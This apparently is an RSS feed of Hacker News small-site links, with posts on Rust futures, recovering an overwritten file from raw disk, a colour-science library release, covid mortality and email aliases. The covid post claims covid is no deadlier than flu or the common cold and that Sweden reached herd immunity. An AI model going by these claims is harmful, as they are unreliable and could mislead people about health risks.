give me some valuable feedback on a very early draft of this book. He has not
read the finished product, but a big thanks is definitely due.</p>
<h2><a href="#translations" id="translations">Translations</a></h2>
<p><a href="https://stevenbai.top/rust/futures_explained_in_200_lines_of_rust/">This book has been translated to Chinese</a> by <a href="https://github.com/nkbai">nkbai</a>.</p>

                    </main>

                    <nav aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        
                            <a rel="next" href="https://cfsamson.github.io/books-futures-explained/0_background_information.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i></i>
                            </a>
                        

                        
                    </nav>
                </div>
            </div>

            <nav aria-label="Page navigation">
                

                
                    <a rel="next" href="https://cfsamson.github.io/books-futures-explained/0_background_information.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i></i>
                    </a>
                
            </nav>

        </div>

        

        
        <!-- Google Analytics Tag -->
        
        

        
        
        

        
        
        

        
        
        
        
        
        
        

        
        
        
        
        

        
        
        

        <!-- Custom JS scripts -->
        

        

    

</div>]]>
            </description>
            <link>https://cfsamson.github.io/books-futures-explained/introduction.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25242849</guid>
            <pubDate>Sun, 29 Nov 2020 04:06:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Undeleting a file overwritten with mv]]>
            </title>
            <description>
<![CDATA[
Score 90 | Comments 30 (<a href="https://news.ycombinator.com/item?id=25242444">thread link</a>) | @todsacerdoti
<br/>
November 28, 2020 | https://behind.pretix.eu/2020/11/28/undelete-flv-file/ | <a href="https://web.archive.org/web/*/https://behind.pretix.eu/2020/11/28/undelete-flv-file/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="https://behind.pretix.eu">
                
                    <span class="blog-title">pretix – behind the scenes</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-11-28">28 Nov 2020</time>
            
                on Technology, Forensics, and Linux
            
        </span> -->

        <!-- <h1 class="post-title">Undeleting a file overwritten with mv</h1> -->

        <section>
            <p>It’s been a while since we shared the story of an incident with you, and that’s probably a good thing –
most operational incidents we had in the past year were “boring” enough in nature to fix them easily.
This time, we’ve got a story of a data loss, caused by pure and simple human error – and the story of
how we recovered the data.</p>

<p>Even though it is quite embarrassing how the data loss happened, we think it’s worth sharing the story
of its recovery, as it might allow you to learn a few useful things in case you ever end up in a
similar situation.</p>

<p>As you might have seen, over the last 7 months we’ve extended our offerings beyond ticketing to allow
our customers to transform their events into the digital space as long as the global pandemic makes
traditional event formats impossible. The result of our effort is a joint venture called 
<a href="https://venueless.org/">Venueless</a> that you should absolutely check out if you haven’t yet.</p>

<p>One component of the virtual events we run on venueless is <strong>live video streaming</strong>. In this process,
our customers use a tool like <a href="https://obsproject.com/">OBS</a> or <a href="https://streamyard.com/">StreamYard</a>
to create a live video stream. The stream is then sent to an <strong>encoding server</strong> of ours via RTMP.
On the encoding server, we re-encode the stream into different quality levels and then distribute
it to our very own tiny streaming CDN.</p>

<p>Venueless currently does <strong>not yet</strong> include a video-on-demand component and usually, our customers record
their content at the source, e.g. with OBS or StreamYard, and process or publish them on their own.
However, just to be safe, we keep a recording of the incoming stream as well. This isn’t currently
part of our promoted service offering, we rather see it as a free backup service to our clients in case they
lose their recording. Given that we already consider it to just be a backup, we currently don’t make any
further backups of this data.</p>

<h4 id="data-loss">Data loss</h4>

<p>Usually, we delete these recordings after a while, but in some cases, our customers ask us to get them, e.g.
because their own recording failed, or because StreamYard only records the first 8 hours of every
stream. Since this doesn’t happen a lot, it’s not yet an automated process in our system. Whenever a customer
requests a recording we SSH into the respective encoding server and move the recording file to a
directory that’s accessible through HTTP, like this:</p>

<pre><code>/var/recordings $ mv recording-12345.flv public/
</code></pre>

<p>That’s it, we share the link with the customer, and the process is done. One of the simplest steps possible
in all this. Yesterday, a customer asked us for the recordings of the two last streams of their event. Just
before finishing up for the week, I wanted to supply them with the required file, SSH’d into the server,
looked for the correct files and typed…</p>

<pre><code>/var/recordings $ mv recording-16678.flv recording-16679.flv
</code></pre>

<p><strong>Oops.</strong> I hit return before typing out <code>public/</code>, and therefore replaced the last stream with the
second-last, losing one of the videos.</p>

<h4 id="damage-control">Damage control</h4>

<p>Having a very naive understanding of how file systems work, I knew that the <code>mv</code> command has only
changed the directory listing of the file system, but hasn’t actually wiped the file from the disk,
so I knew there is likely still a chance to recover the file, if it’s not overwritten by something
else in the meantime.</p>

<p>Since I didn’t manage to re-mount the root partition as read-only to avoid further damage softly,
I used the <a href="https://www.kernel.org/doc/html/latest/admin-guide/sysrq.html">big hammer</a> to remount
everything read-only immediately:</p>

<pre><code># echo u &gt; /proc/sysrq-trigger
</code></pre>

<p>Uhm, okay, this worked, but how do I install any data recovery tools now? After some experiments,
I decided it would be easiest to reboot into the recovery system provided by our server provider
<a href="https://www.hetzner.com/">Hetzner</a>. So I configured the boot loader to boot their recovery system
from the network and forcefully rebooted the server.</p>

<p>To be able to perform disk dumps and have some operational flexibility without downloading a 2 TB
disk image to my local machine (which would take rougly a week), I also quickly purchased
a <a href="https://www.hetzner.com/storage/storage-box">Hetzner Storage Box</a> with 5 TB space.</p>

<h4 id="failed-attempts">Failed attempts</h4>

<p>Just before I executed my fatal <code>mv</code> command, I executed <code>ls -lisah</code> to get a directory listing
of the files:</p>

<pre><code>3146449 1.1G -rw-r--r-- 1 www-data www-data 1.1G Nov XX XX:XX recording-16678.flv
3146113 1.6G -rw-r--r-- 1 www-data www-data 1.6G Nov XX XX:XX recording-16679.flv
</code></pre>

<p>This meant I <strong>knew</strong> the inode number of the deleted file! As I mentioned before, my understanding
of file systems was (and is) rather naive, and I was pretty optimistic to be able to recover the
file using that information. Isn’t that sort of what a journaling file system is for?</p>

<p>Recovering the file this way hover appeared to be impossible. <a href="http://ext4magic.sourceforge.net/howto_en.html">ext4magic</a>
and <a href="http://extundelete.sourceforge.net/">extundelete</a> are powerful tools that did find some 
deleted files on my disk – but not the one I was looking for, even after trying different options
for over two hours.</p>

<p>I did not spend the time to really understand how ext4 works, but from what I gathered from various
blogs, I was pretty much out of luck since the inode did no longer contain the relevant information
and ext4magic also wasn’t able to <a href="http://ext4magic.sourceforge.net/howto_en.html#Recovery_process_5">recover the neccessary information from the journal</a>
either.</p>

<pre><code>debugfs:  inode_dump &lt;3146113&gt;
0000  a081 0000 8503 0000 e83a c15f e83a c15f  .........:._.:._
0020  e83a c15f 0000 0000 7200 0100 0800 0000  .:._....r.......
0040  0000 0800 0100 0000 0af3 0100 0400 0000  ................
0060  0000 0000 0000 0000 0100 0000 e6eb c000  ................
0100  0000 0000 0000 0000 0000 0000 0000 0000  ................
*
0140  0000 0000 92d0 2cf5 0000 0000 0000 0000  ......,.........
0160  0000 0000 0000 0000 0000 0000 6fb2 0000  ............o...
0200  2000 e3fb 208a 515b 7c65 5d5a 7c65 5d5a   ... .Q[|e]Z|e]Z
0220  e83a c15f 7c65 5d5a 0000 0000 0000 0000  .:._|e]Z........
0240  0000 0000 0000 0000 0000 0000 0000 0000  ................
*
</code></pre>

<p>However, if you’re in a similar situation – the ext4magic how-tos are really helpful and worth a try.</p>

<h4 id="successful-recovery">Successful recovery</h4>

<p>There is this one other approach to file recovery that is often recommended on the internet, usually
for “small text files”: Just <code>grep</code> your whole disk for known parts of its contents! So why wouldn’t
this work on larger non-text files as well?</p>

<p>The first problem is obviously what to grep for. The only thing I know about the missing file, apart
from its rough size, is that it’s a FLV video file. Luckily, <a href="https://en.wikipedia.org/wiki/Flash_Video#Flash_Video_Structure">all FLV files</a>
that contain video start with the byte sequence <code>FLV\x01\x05</code>. So let’s search our 2 TB disk for
that byte sequence and print out the byte offset of all occurences!</p>

<pre><code>cat /dev/md2 \
	| pv -s 1888127576000 \
	| grep -P --byte-offset --text 'FLV\x01\x05' \
	| tee -a /mnt/storagebox/grep-log.txt
</code></pre>

<p>This took roughly 7 hours. The <code>pv</code> command with the (rough) total size of the disk is optional, but gives you
a nice progress bar. Overall, this took a little over 6 hours on our server.</p>

<p><code>grep</code> works line-based, which in a binary file menas “any byte sequence between two ASCII line breaks”. The
log file therefore contained lots of lines like this:</p>

<pre><code>184473878409:&lt;some binary data&gt;FLV&lt;some binary data&gt;
</code></pre>

<p>In total, the search found 126 FLV file headers on our disk. This was pretty reassuring, since we had 122 FLV files
still known to the file system – so there are at least four FLV byte sequences without a filename!</p>

<pre><code># find /mnt/disk/var/recordings/ -name '*.flv' -not -empty -ls | wc -l
122
</code></pre>

<p>Now, I needed to find out which of the 126 byte sequences did not have a filename. Since I really didn’t want
to spend all weekend with a deep-dive into the ext4 disk layout, I went for an easier solution: For every file
still known in the file system, I computed a hash of the first 500 kilobytes of the file:</p>

<figure><pre><code data-lang="python"><span>#!/usr/bin/python3
</span><span>import</span> <span>glob</span>
<span>import</span> <span>hashlib</span>
<span>import</span> <span>os</span>

<span>hashsize</span> <span>=</span> <span>500</span> <span>*</span> <span>1024</span>
<span>known_hashes</span> <span>=</span> <span>{}</span>
<span>not_deleted_files</span> <span>=</span> <span>sorted</span><span>(</span>
    <span>glob</span><span>.</span><span>glob</span><span>(</span><span>'/mnt/disk/var/recordings/*.flv'</span><span>)</span> <span>+</span> 
    <span>glob</span><span>.</span><span>glob</span><span>(</span><span>'/mnt/disk/var/recordings/public/*.flv'</span><span>)</span>
<span>)</span>
<span># Ignore files shorter than our hash size
</span><span>not_deleted_files</span> <span>=</span> <span>[</span>
    <span>f</span> <span>for</span> <span>f</span> <span>in</span> <span>not_deleted_files</span>
    <span>if</span> <span>os</span><span>.</span><span>stat</span><span>(</span><span>f</span><span>).</span><span>st_size</span> <span>&gt;</span> <span>hashsize</span>
<span>]</span>

<span>for</span> <span>fname</span> <span>in</span> <span>not_deleted_files</span><span>:</span>
    <span>with</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>'rb'</span><span>)</span> <span>as</span> <span>f</span><span>:</span>
        <span>h</span> <span>=</span> <span>hashlib</span><span>.</span><span>md5</span><span>(</span><span>f</span><span>.</span><span>read</span><span>(</span><span>hashsize</span><span>)).</span><span>hexdigest</span><span>()</span>
        <span>if</span> <span>h</span> <span>in</span> <span>known_hashes</span><span>:</span>
            <span>print</span><span>(</span><span>"duplicate hash found:"</span><span>)</span>
        <span>known_hashes</span><span>[</span><span>h</span><span>]</span> <span>=</span> <span>fname</span>
        <span>print</span><span>(</span><span>h</span><span>,</span> <span>fname</span><span>)</span>

<span>print</span><span>(</span>
    <span>len</span><span>(</span><span>not_deleted_files</span><span>),</span> <span>"files with"</span><span>,</span>
    <span>len</span><span>(</span><span>known_hashes</span><span>),</span> <span>"hashes"</span>
<span>)</span></code></pre></figure>

<p>Interestingly, two files from the completely different customers shared the same hash of the first 500 kilobytes.
I haven’t tested it yet, but my theory is that those were streams that just did not contain any audio or video
in their first minutes, but only empty frames. However, since I knew this isn’t the case for my missing file,
I felt confident in proceeding with this approach.</p>

<p>Next, I computed the same hash for every byte offest found by grep and compared it to the hashes found in the
previous step:</p>

<figure><pre><code data-lang="python"><span>grep_log</span> <span>=</span> <span>'/mnt/storagebox/grep-log.txt'</span>
<span>disk</span> <span>=</span> <span>'/dev/md2'</span>

<span>print</span><span>(</span><span>"Parsing grep log…"</span><span>)</span>
<span>positions</span> <span>=</span> <span>[]</span>
<span>with</span> <span>open</span><span>(</span><span>grep_log</span><span>,</span> <span>'rb'</span><span>)</span> <span>as</span> <span>f</span><span>:</span>
    <span>for</span> <span>line</span> <span>in</span> <span>f</span><span>.</span><span>read</span><span>().</span><span>split</span><span>(</span><span>b'</span><span>\n</span><span>'</span><span>):</span>
        <span>if</span> <span>not</span> <span>line</span><span>:</span>  <span># ignore empty line e.g. at end of file
</span>            <span>continue</span>
        <span>pos</span><span>,</span> <span>data</span> <span>=</span> <span>line</span><span>.</span><span>split</span><span>(</span><span>b':'</span><span>,</span> <span>1</span><span>)</span>
        <span>pos</span> <span>=</span> <span>int</span><span>(</span><span>pos</span><span>.</span><span>decode</span><span>())</span>
        <span># add offset of FLV within line
</span>        <span>binoffset</span> <span>=</span> <span>data</span><span>.</span><span>index</span><span>(</span><span>b"FLV</span><span>\x01</span><span>"</span><span>)</span>
        <span>pos</span> <span>+=</span> <span>binoffset</span> 
        <span>positions</span><span>.</span><span>append</span><span>(</span><span>pos</span><span>)</span>

<span>print</span><span>(</span><span>"Computing hashes of files on disk…"</span><span>)</span>
<span>found_hashes</span> <span>=</span> <span>{}</span>
<span>with</span> <span>open</span><span>(</span><span>disk</span><span>,</span> <span>'rb'</span><span>)</span> <span>as</span> <span>f</span><span>:</span>
    <span>for</span> <span>p</span> <span>in</span> <span>positions</span><span>:</span>
        <span>f</span><span>.</span><span>seek</span><span>(</span><span>p</span><span>)</span>
        <span>d</span> <span>=</span> <span>f</span><span>.</span><span>read</span><span>(</span><span>hashsize</span><span>)</span>
        <span>h</span> <span>=</span> <span>hashlib</span><span>.</span><span>md5</span><span>(</span><span>d</span><span>).</span><span>hexdigest</span><span>()</span>
        <span>if</span> <span>h</span> <span>in</span> <span>known_hashes</span><span>:</span>
            <span>print</span><span>(</span><span>"At offset"</span><span>,</span> <span>p</span><span>,</span> <span>"found known hash"</span><span>,</span> <span>h</span><span>,</span>
                  <span>"corresponding to"</span><span>,</span> <span>known_hashes</span><span>[</span><span>h</span><span>])</span>
        <span>else</span><span>:</span>
            <span>print</span><span>(</span><span>"At offset"</span><span>,</span> <span>p</span><span>,</span> <span>"found unknown hash"</span><span>,</span> <span>h</span><span>)</span>
        <span>found_hashes</span><span>[</span><span>h</span><span>]</span> <span>=</span> <span>p</span>

<span>unknown_hashes</span> <span>=</span> <span>{</span>
    <span>h</span><span>:</span> <span>p</span> <span>for</span> <span>h</span><span>,</span> <span>p</span> <span>in</span> <span>found_hashes</span><span>.</span><span>items</span><span>()</span>
    <span>if</span> <span>h</span> <span>not</span> <span>in</span> <span>known_hashes</span>
<span>}</span>
<span>files_not_found</span> <span>=</span> <span>[</span>
    <span>fname</span> <span>for</span> <span>h</span><span>,</span> <span>fname</span> <span>in</span> <span>known_hashes</span><span>.</span><span>items</span><span>()</span>
   …</code></pre></figure></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://behind.pretix.eu/2020/11/28/undelete-flv-file/">https://behind.pretix.eu/2020/11/28/undelete-flv-file/</a></em></p>]]>
            </description>
            <link>https://behind.pretix.eu/2020/11/28/undelete-flv-file/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25242444</guid>
            <pubDate>Sun, 29 Nov 2020 02:21:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Colour Science for Python – 0.3.16]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25242149">thread link</a>) | @kelsolaar
<br/>
November 28, 2020 | https://www.colour-science.org/posts/colour-0316-is-available/ | <a href="https://web.archive.org/web/*/https://www.colour-science.org/posts/colour-0316-is-available/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody text">
    <div>
<p><a href="https://github.com/colour-science/colour/releases/tag/v0.3.16">Colour 0.3.16</a>
has finally been released!</p>
<!-- TEASER_END -->
<p>This release integrates all the <a href="https://summerofcode.withgoogle.com/">GSoC</a>
work from Pawel (<a href="https://github.com/enneract">@enneract</a>), most of the code
from Nishant (<a href="https://github.com/njwardhan">@njwardhan</a>) and, the
optimizations from Omar (<a href="https://github.com/OmarWagih1">@OmarWagih1</a>).
We would like to thank them again for their great contributions!</p>
<p><img alt="/images/Blog_Colour_Rendition_Report.png" src="https://www.colour-science.org/images/Blog_Colour_Rendition_Report.png"></p><p>With this release, we stop testing for
<a href="https://www.python.org/downloads/release/python-350/">Python 3.5</a> and,
<a href="https://docs.scipy.org/doc/scipy/reference/release.1.1.0.html">Scipy&gt;=1.1.0</a>
becomes the minimum version. This is also the <strong>last feature release to
support</strong> <a href="https://www.python.org/downloads/release/python-270/">Python 2.7</a>.
We will also trim the deprecation code in the next version thus, please make
sure to update your code accordingly.</p>
<p>Besides the various minor changes and fixes, the highlights of this release are:</p>
<ul>
<li><p>Support for <em>Jakob and Hanika (2019)</em>, <em>Mallett and Yuksel (2019)</em> and,
<em>Otsu, Yamamoto and Hachisuka (2018)</em> spectral upsampling methods thanks to
Pawel's contributions as part of GSoC 2020.</p></li>
<li><p>Support for the computation of the <em>CIE 2017 Colour Fidelity Index</em> and
<em>ANSI/IES TM-30-18 Colour Fidelity Index</em> colour quality metrics thanks to
Pawel's contributions as part of GSoC 2020.</p></li>
<li><p>Support for generation of the <em>ANSI/IES TM-30-18 Colour Rendition Report</em>
thanks to Pawel's contributions as part of GSoC 2020.</p></li>
<li><p>Improvements of the LUT IO support thanks to Nishant's contributions as
part of GSoC 2020.</p></li>
<li><p>Performance improvements thanks to Omar's contributions as part of GSoC
2020.</p></li>
<li><p>Support for <em>ACES Input Device Transform (IDT)</em> generation: The
implementation follows to some extent
<a href="https://github.com/ampas/rawtoaces">RAW to ACES v1</a> and
<a href="https://www.dropbox.com/s/ouwnid1aevqti5d/P-2013-001.pdf?dl=0">P-2013-001</a>
procedure.</p></li>
<li>
<p>New <em>ISO</em> spectral datasets:</p>
<ul>
<li><p>ISO 6728 Standard Lens</p></li>
<li><p>ISO 7589 Diffuser</p></li>
<li><p>ISO 7589 Photographic Daylight</p></li>
<li><p>ISO 7589 Sensitometric Daylight</p></li>
<li><p>ISO 7589 Studio Tungsten</p></li>
<li><p>ISO 7589 Sensitometric Studio Tungsten</p></li>
<li><p>ISO 7589 Photoflood</p></li>
<li><p>ISO 7589 Sensitometric Photoflood</p></li>
<li><p>ISO 7589 Sensitometric Printer</p></li>
</ul>
</li>
<li><p>Support for IGPGTG colourspace by <em>Hellwig and Fairchild (2020)</em>.</p></li>
<li><p>The <cite>colour.SpectralDistribution.interpolate</cite> and
<cite>colour.MultiSpectralDistributions.interpolate</cite> methods now honour class
instantiation time interpolation parameters instead of blindly applying
<em>CIE 167:2005</em> recommendation, this introduces minor numerical changes.</p></li>
<li><p>Many definitions, methods and module attributes have been renamed to
improve consistency and we are reaching a satisfactory point in that
regard, hopefully, the names will be much more stable from now on.</p></li>
</ul>
<p>Please visit the <a href="https://github.com/colour-science/colour/releases/tag/v0.3.16">releases page</a>
for complete details.</p>
<p>Our other dependent Python packages have also been updated accordingly:</p>
<ul>
<li><p><a href="https://github.com/colour-science/colour-demosaicing/releases/tag/v0.1.6">Colour - Demosaicing - 0.1.6</a></p></li>
<li><p><a href="https://github.com/colour-science/colour-hdri/releases/tag/v0.1.8">Colour - HDRI - 0.1.8</a></p></li>
<li><p><a href="https://github.com/colour-science/colour-checker-detection/releases/tag/v0.1.2">Colour - Checker Detection - 0.1.2</a></p></li>
<li>
<p><a href="https://github.com/colour-science/colour-datasets/releases/tag/v0.1.1">Colour - Datasets - 0.1.1</a></p>
<ul>
<li>
<p>The following new datasets have been added:</p>
<blockquote>
<ul>
<li><p>4050598 : Spectral Upsampling Coefficient Tables - Jakob and
Hanika (2019)</p></li>
<li><p>4051012 : Measured Commercial LED Spectra - Brendel (2020)</p></li>
</ul>
</blockquote>
</li>
</ul>
</li>
</ul>
</div>
    </div></div>]]>
            </description>
            <link>https://www.colour-science.org/posts/colour-0316-is-available/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25242149</guid>
            <pubDate>Sun, 29 Nov 2020 01:24:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How deadly is Covid-19?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25241663">thread link</a>) | @Malbolge
<br/>
November 28, 2020 | https://sebastianrushworth.com/2020/10/24/how-deadly-is-covid-19/ | <a href="https://web.archive.org/web/*/https://sebastianrushworth.com/2020/10/24/how-deadly-is-covid-19/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <amp-auto-ads type="adsense" data-ad-client="ca-pub-1298191191396779" i-amphtml-layout="container"></amp-auto-ads><p><a href="https://cornucopia.cornubot.se/2020/10/september-2020-den-minst-dodliga.html" target="_blank" rel="noreferrer noopener">September 2020 was the least deadly month in Swedish history</a>, in terms of number of deaths per 100,000 population. Ever. And I don’t mean the least deadly September, I mean the least deadly month. Ever. To me, this is pretty clear evidence of two things. First, that covid is not a very deadly disease. And second, that Sweden has herd immunity.</p><p><a href="https://twitter.com/sebrushworth/status/1319222055343185921" target="_blank" rel="noreferrer noopener">When I posted this information on my twitter feed</a>, the response from proponents of further lockdown was that the reason September was such an un-deadly month, was because everyone has already died earlier in the pandemic. To me, that seems like a pretty self-defeating argument. Why?</p><p>Because 6,000 people have died of covid in Sweden, a country with a population of 10,000,000 people. 6,000 people is 0,06% of the population. If it is enough for that tiny a fraction of a population to die of a pandemic for the pandemic to peter out so completely that a country can have its least deadly month ever, then the pandemic was never that deadly to begin with.</p><p>In August, <a href="https://sebastianrushworth.com/2020/08/04/how-bad-is-covid-really-a-swedish-doctors-perspective/" target="_blank" rel="noreferrer noopener">I wrote an article where I proposed that the mortality for covid is only 0,12%</a>, roughly the same as influenza. That number was based on a back-of-the-envelope calculation. I figured that, since the death rate had dropped continuously for months and was at very low levels, Sweden must have reached a point where it had herd immunity. And I figured that at least 50% of the population must have been infected for herd immunity to have been reached. 50% of Sweden’s population is five million people. 6,000 / 5,000,000 = 0,12%</p><p>At the beginning of October, one of the World Health Organisation’s executive directors, Mike Ryan, <a href="https://www.irishtimes.com/news/ireland/irish-news/covid-19-world-in-for-a-hell-of-a-ride-in-coming-months-dr-mike-ryan-says-1.4370626" target="_blank" rel="noreferrer noopener">said that the WHO estimated that 750 million people had so far been infected with covid</a>. At that point, one million people had died of the disease. That gives a death rate for covid of 0,13% . So the WHO said that the death rate is 0,13% . Not too far off my earlier back-of-envelope estimation. This of course begs the question why there are continued lockdowns for a disease that is no worse than the flu.</p><p>A short while later, the <a href="https://www.who.int/bulletin/online_first/BLT.20.265892.pdf" target="_blank" rel="noreferrer noopener">WHO released an analysis by professor John Ioannidis</a>, with his estimate of the covid death rate. This analysis was based on seroprevalance data, i.e. data on how many people were shown to have antibodies to covid in their bloodstream at different times in different countries, which was correlated with the number of deaths in those countries. Through this analysis, professor Ioannidis reached the conclusion that covid has an overall mortality rate of around 0,23% (in other words, one in 434 infected people die of the disease). For people under the age of seventy, the mortality rate was estimated at 0,05% (in other words, one in 2,000 infected people under the age of 70 die of the disease).</p><p><a href="https://sebastianrushworth.com/2020/09/28/herd-immunity-without-antibodies/" target="_blank" rel="noreferrer noopener">As I’ve discussed before, I don’t think antibody data gives a very complete picture</a>, since there are studies showing that a lot of people don’t produce measurable antibodies in their bloodstreams, but still have immunity, either thanks to a T-cell response, or thanks to local antibody production in the respiratory tract. So I think that the fatality rate is significantly lower than what the analysis by professory Ioannidis found, and more in line with what the WHO stated earlier in October.</p><p>But even if the antibody based number is the correct number, then covid still is not a very deadly disease. For comparison, the 1918 flu pandemic is thought to have had an infection fatality rate of 2,5%, i.e. one in forty infected people died. So the 1918 flu was 11 times more deadly than covid if you go by professor Ioannidis antibody based numbers, and 19 times more deadly than covid if you go by the fatality rate provided 12 days earlier by the WHO’s Mike Ryan.</p><p>And this is missing one big point about covid. The average person who dies from covid is over 80 years old and has multiple underlying health conditions. In other words, their life expectancy is very short. The average person who died in the 1918 pandemic was in their late 20’s. So each death in the 1918 pandemic actually meant around 50 years more of life lost per person than each death in the covid pandemic. Multiply that by the fact that it had a 19 times higher death rate, and the 1918 flu was in fact 950 times more deadly than covid, in terms its capacity to shorten people’s lives.</p><p>Ok, I’ve discussed the fatality rate of the 1918 flu pandemic, and compared that to covid. But what about the fatality rate of the common cold viruses that are constantly circulating in society? How does covid compare to them?</p><p>Many people think that the common cold viruses are harmless. But in fact, among elderly people with underlying health conditions, they are frequently deadly. <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5343795/" target="_blank" rel="noreferrer noopener">A study carried out in 2017</a> found that, among frail elderly people, rhinovirus is actually more deadly than regular influenza. In that study, the 30 day mortality for frail elderly people admitted to hospital due to a rhinovirus infection was 10% . For frail elderly people admitted to hospital due to influenza, 30 day mortality was 7% .</p><p>What is my point?  If you are old and frail, and have underlying health conditions, then even that most harmless of all infections, the so called “common cold”, can be deadly. In fact, it often is. Covid-19 is not a unique disease, and does not appear to have a noticeably higher mortality rate than the so called “common cold”.</p><p>There is one final aspect to all this that needs to be discussed. And that is the effect of covid on overall mortality. If it turns out that covid has no effect on overall mortality, then that really brings in to question why we are locking down, since we’re not actually preventing any deaths. So, what is the effect of covid on overall mortality?</p><p>Let’s look at Sweden, since that is perhaps the country that has taken the most relaxed approach of any to preventing spread, and which should therefore also reasonably be expected to have had the highest impact on its overall death rate. From January to September 2020, <a href="https://cornucopia.cornubot.se/2020/10/september-2020-least-deadly-month-ever.html" target="_blank" rel="noreferrer noopener">Sweden experienced 687 deaths per 100,000 population</a>. The last time Sweden had a deadlier year was 2015. Personally, I don’t remember any big deadly pandemic happening in 2015.</p><p>In fact, 2020 is so far one of the least deadly years in Swedish history, and is largely in line with the average for the preceding five years. To be precise, it is 2,7% higher than the average for the preceding five years, which is well within the margin of error. In 2019, mortality was 6% lower than the average, so it should be expected that 2020 would have a slightly higher mortality than average, even without covid.</p><p>What does this mean? It means that covid, a supposedly deadly viral pandemic, has not killed enough Swedes to have any noticeable impact on overall mortality.</p><p>How can this be explained, when we know that 6,000 Swedes have died of covid?</p><p>As I see it, there are two possible explanations. The first is that most people who died “of” covid actually died with covid. In other words, they had a positive covid test and were therefore characterized as covid deaths, when the actual cause of death was something else. The second is that most people who died of covid were so old, and so frail, and had so many underlying health conditions, that even without covid, they would have died by now. There are no other reasonable explanations.</p><p>I am not saying that covid is nothing, or that it doesn’t exist. I am saying that it is a virus with a marginal effect on longevity. And yet, public policy in most countries has been driven by doomsday scenarios based on completely unrealistic numbers.  To put it simply, we’ve acted like we’re dealing with a global ebola outbreak, when covid is much more like the common cold.</p><p>UPDATE (26th October 2020): After SCB updated their numbers it has become clear that September 2020 was in fact the second least deadly month in Swedish history, not the least deadly month. That award goes to June 2019.</p><p>You might also enjoy reading my article <a href="https://sebastianrushworth.com/2020/09/19/covid-19-does-sweden-have-herd-immunity/" target="_blank" rel="noreferrer noopener">about why I think Sweden has herd immunity</a>, or enjoy watching <a href="https://sebastianrushworth.com/2020/10/13/covid-podcast-with-ivor-cummins/" target="_blank" rel="noreferrer noopener">my conversation with Ivor Cummins of Fat Emperor about covid-19</a>.</p><section id="blog_subscription-17"></section><div><div><p> I am a practicing physician in Stockholm, Sweden. My main interests are evidence based medicine, medical ethics, and medical history. I frequently get asked questions by my patients about health, diet, exercise, supplements, and medications. The purpose of this blog is to try to understand what the science says and to translate it in to a format that non-scientists can understand. <a href="https://sebastianrushworth.com/author/doctorsebastian/" rel="author"> View all posts by Sebastian Rushworth, M.D. </a></p></div></div></div></div>]]>
            </description>
            <link>https://sebastianrushworth.com/2020/10/24/how-deadly-is-covid-19/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25241663</guid>
            <pubDate>Sat, 28 Nov 2020 23:55:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: SimpleLogin – protect online privacy using email alias]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25241372">thread link</a>) | @sonmicrosystems
<br/>
November 28, 2020 | https://simplelogin.io/blog/an-email-for-each-website/ | <a href="https://web.archive.org/web/*/https://simplelogin.io/blog/an-email-for-each-website/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="hello-bar" role="alert">
    <p>
    SimpleLogin is featured in
    <a href="https://lespepitestech.com/startup-de-la-french-tech/simplelogin" target="_blank" rel="noopener" data-toggle="tooltip" title="aka the French ProductHunt">Les PÃ©pites Tech â†—</a>
  </p></div><div id="content" role="main">
    <div>
        

        

        

        <blockquote>
<p>Why do I receive so many spams?</p>
</blockquote>

<p>When this question was asked by my girlfriend (now wife ðŸ˜…), my immediate answer was “Stop giving away your email” and I suggested creating a secondary email for “suspicious” websites. Also, using the same email everywhere is like leaving the same <strong>footprint</strong> on the Internet, allowing advertisers to <code>cross-reference</code> your online behavior.</p>



<p>
    <img src="https://simplelogin.io/blog/footprint.jpeg" alt="Fingerprint image">
</p>


<p>She followed the advice, created a second email and was happy at first. But now she doesn’t even check this mailbox as there are so many spams in it ðŸ’�ðŸ�»â€�â™€ï¸�.</p>

<p>So creating a second email is not a true solution. She needs more than 2, maybe hundreds. <strong>And why not an email for each website</strong>? But she cannot go to Gmail or Outlook to create hundreds of accounts, this is unmanageable. There must be a better way.</p>

<p>The solution is <code>email alias</code>. An alias is a normal email address but all emails sent to an alias will be <strong>forwarded</strong> to your real email address. Alias acts therefore as a <strong>shield</strong> (or a proxy) for your real email address. An alias can be disabled anytime, making the spams stop.</p>

<p>Nowadays, some websites allow to unsubscribe quickly but a lot of them still make unsubscribing a difficult process. Some wouldn’t even honor the request. And this doesn’t stop the websites from cross-referencing your data with your email being the common key.</p>

<p>Let’s make spammers’ life harder with email alias!</p>


        <p>
            Written by <img src="https://simplelogin.io/images/son.jpg" alt="Author Image">
            Son Nguyen Kim
            <a href="https://twitter.com/nguyenkims">
                [Follow on Twitter]
            </a>
        </p>


        
        <h3>Other posts</h3>
        
        


        <hr>
        <div>
            <p>Wonder why you received so many spams? Protect your email address with SimpleLogin alias. </p>
            <p><span>
                <a href="https://simplelogin.io/">Learn More</a>
            </span>
        </p></div>
    </div>
